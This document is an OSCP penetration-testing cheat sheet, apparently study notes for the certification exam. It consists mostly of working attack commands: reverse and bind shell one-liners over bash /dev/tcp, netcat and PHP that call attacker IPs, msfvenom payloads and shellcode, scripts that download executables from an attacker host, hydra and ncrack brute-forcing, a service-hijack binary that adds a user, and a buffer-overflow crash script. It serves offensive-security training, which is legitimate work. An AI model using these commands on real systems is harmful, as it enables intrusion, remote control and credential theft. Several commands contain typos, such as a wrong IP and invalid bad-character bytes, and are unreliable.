# OSCP Cheat Sheet

## Enumeration/Scanning
https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html

### TCP Scan
`nmap -sC -sV -O [ip]`

`unicornscan [ip]:1-65535`


### UDP Scan
`nmap [ip] -sU`

`unicornscan -mU -v -I [ip]`


### FTP (21)
`nmap -p 21 [ip] --script=ftp-anon`

`nmap -p 21 [ip] --script=ftp-brute`

`nmap -p 21 [ip] --scipt=ftp*`


### SMTP (25)
`nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [ip]`

`telnet [ip] 25`


### HTTP/HTTPS (80/443)
`nikto -h [ip]`

`dirbuster`

`robots.txt`


#### Wordpress
`nmap -p 80,443 [ip] --script=wordpress*`


### Kerberos (88)
MS14-068

### Pop3 (110)
`telnet [ip] 110`

`USER [username]`

`PASS [password]`

`LIST`

`RETR`

`QUIT`


### RPCBind (111)
`rpcinfo -p [ip]`

`rpcbind -p [ip]`


### SMB/Samba (139, 455)
`nmap -p 139,445 [ip] --script=smb-enum*`

`nmap -p 139,445 [ip] --script=smb-os-discovery`

`nmap -p 139,445 [ip] --script=smb-vuln*`

`enum4linux -a [-u username] [-p password] [ip]`

`smbmap [-u username] [-p password] [ip]`

`smbclient -L \\\\[ip]\\[share]`

`nmblookup -A [ip]`

#### What we're looking for
- Misconfigurations in permissions of shares (Null sessions or read and/or write access)
- Sensitive information that can be levereged elsewhere (credentials or version number)

#### Resources

##### Spreadsheet Checklist
https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/edit#gid=2080645025

##### Gitlab Checklist
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#checklist

##### Hacking Articles SMB
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/


### SNMP (161)
`snmpwalk -c public -v1 [ip]`

`snmpcheck -t [ip] -c public`

`onesixtyone -c names -i hosts`

`snmpenum -t [ip]`



## Exploitation
https://sushant747.gitbooks.io/total-oscp-guide/exploiting.html

### Shells

#### Msfvenom

##### Meterpreter Usage
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe`

`use exploit/multi/handler`

`set payload windows/meterpreter/reverse_tcp`


##### Non-staged Payload
`msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [exe/php/sh] -o shell_reverse_tcp.[ext]`

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [exe/php/sh] -o shell_reverse_tcp.[ext]`


##### Staged Payload
`msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [format] -o staged_reverse_tcp.[ext]`

`msfvenom -p linux/x86/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [format] -o staged_reverse_tcp.[ext]`


#### Bash
`0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196`

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`


#### PHP
`php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`


#### Netcat

##### Linux
Bind - `nc -vlp 5555 -e /bin/bash`

Reverse - `nc 192.168.1.101 5555 -e /bin/bash`

Without -e flag - `rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p`

##### Windows
Bind - `nc.exe -nlvp 4444 -e cmd.exe`

Reverse - `nc.exe 192.168.1.101 443 -e cmd.exe`


#### OpenBSD
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`


### Editing Exploits
Common problems are incorrect payload or return address

### Compiling Windows Exploits
64-bit - `i686-w64-mingw32-gcc exploit.c -o exploit`

32-bit - `i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32`

## File Transfer

### tFTP
`mkdir /tftp`

`atftpd --daemon --port 69 /tftp`

### FTP
`apt-get update && apt-get install pure-ftpd`

`./setup-ftp.sh`

#### Non-Interactive Version(Windows)
```
echo open ip 21> ftp.txt
echo USER offsec>> ftp.txt
echo [password]>> ftp.txt
echo bin >> ftp.txt
echo [GET/get] bruh.txt >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:nonInteractiveFtp.txt
```


### VBS (Windows)
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

### PowerShell
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Linux
````
wget
curl
````

### Debug
```
upx -9 nc.exe --> compresses file to under 64kb
wine exe2bat.exe nc.exe nc.txt
copy to windows machine with echo commands on remote shell
```



## Password Cracking

### crunch
`crunch 6 6 0123...(alphabet) -o crunch.txt`

### pw/fgdump

### Windows Credentials Editor
`wce.exe -w`

### cewl
`cewl www.bruh.com -m 6 -w cewl.txt`

### medusa (htaccess)
`medusa -h [ip] -u admin -P passfile.txt -M http -m`


### ncrack(rdp)
`ncrack -vv --user offsec -P passfile.txt rdp://[ip]`

### hydra(SNMP, SSH)
```
hydra -P passfile.txt -v [ip] snmp
hydra -l root -P passfile.txt [ip] ssh
```

### hash-identifier

### John
`john --wordlist=/path/to/wordlist [hash file]`

#### Windows
Use output of pw/fgdump/wce


#### Linux
Use /etc/passwd and /etc/shadow
`unshadow passwd shadow` >  john


## Tunneling and Port Forwarding

### Port Forwarding/Redirection
`apt-get install rinetd`

`nano /etc/rinetd.conf` - add bindaddress bindport connectaddress connectport (middle man)

configures machine to forward traffice from bindaddress and bindport to connect address and connectport


### SSH Tunneling

#### Local Port Forwarding

`ssh [middleip] -p [middleport] [locallistenport]:[connectaddress]:[connect port]`

we can now listen on port 8080 for incoming traffice from connect address on localhost


#### Remote Port Forwarding
opens up ports on victim machine that are closed off from attacking machine (say we want to rdp)
`ssh [attacking machine] -p [attacking port] -R [port to tunnel to on attacking machine]:127.0.0.1:[port service is running on]` now attacker just connects to localhost on their assigned port


#### Dyanmic Port Forwarding
Where we set up local machine to forward traffice to any remote destination through a proxy
`ssh -D [local proxy port] -p [remote port] [target ip]`



## Local Privilege Escalation

### Rescources
https://guif.re/windowseop

https://sushant747.gitbooks.io/total-oscp-guide/post_exploitation.html

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Windows.pdf

https://www.fuzzysecurity.com/tutorials/16.html

https://gist.github.com/sckalath/8dacd032b65404ef7411

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Exploit Suggester scripts(kernel)

### Windows

#### System info

#### Scripts

#### Services(DLL, binpath, registry, exe)
`accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in users group
`accesschk64.exe -wuvc [service]` - checks permissions on service 
Example had you look for SERVICE_CHANGE_CONFIG to be writeable so we could change binpath

#### Unqouted Paths

`wmic service get name,pathname,startmode` - find unquoted file paths for services
`msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service

#### Autorun
We're looking for execeutables that are automaticaly executed on some event (logon tab for autorun). Hopefully one of these executables has had poor misconfigurations for permissionsC


#### Cleartext or b64 passwords


#### Pass the hash


#### Services only avalailable from loopback


#### Scheduled Tasks


#### AlwaysInstallElevated


#### Kernel Exploits

#### Useful commands

#### Metasploit Modules

#### WMIC



### Linux

#### Scripts

#### Programs running as root

#### Passwords

#### Loopback services

#### Suid and Guid

#### SUdo

#### Perms

#### bad path

#### Cron

#### Unmounted filesystems

#### NFS Share

## Buffer Overflow

### Tips

- Restart the debugger with each test
- Use nano
- Bad characters in instructions and addresses
- Set breakpoints

### Replicating Crash

Use a PoC script to crash the program such as
```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2700
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.1.101', 9999))
    data = s.recv(1024)
    s.send(buffer)
    print "\nDone!."
except:
    print "bruhbad"

```


### Finding Location of RA

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [no of bytes]`

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [no of bytes] -q [value of ra (no 0x)]`


### Bad Characters
Character is bad if it is not found in buffer or truncates the payload

```
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```


### Locating Space for Shellcode
Look where registers point to at crash. SLMail example conveniently points to point after ra whereas crossfire has registers pointing to locations without enough space or require some editing.


### Finding useful instructions

#### Finding opcode of instruction
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`

#### IDB
`!mona modules`

- Find module with no DEP and ASLR (all except last column false)

`!mona find -s “\xff\xe4” -m slmfc.dll`

- jmp esp in SLMail case


#### EDB

- Plugns --> opcode searcher --> opcode search
- Use when program is crashed
- use bar on right to search for instructions equivalent to changing eip register
  - ExP --> EIP
- click on segment wich read and execute permissions
- click find

- crossfire case has you add 12 bytes to eax as first stage shellcode
```
add eax 12
jmp eax
```

### Generating Shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`

`msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`

`
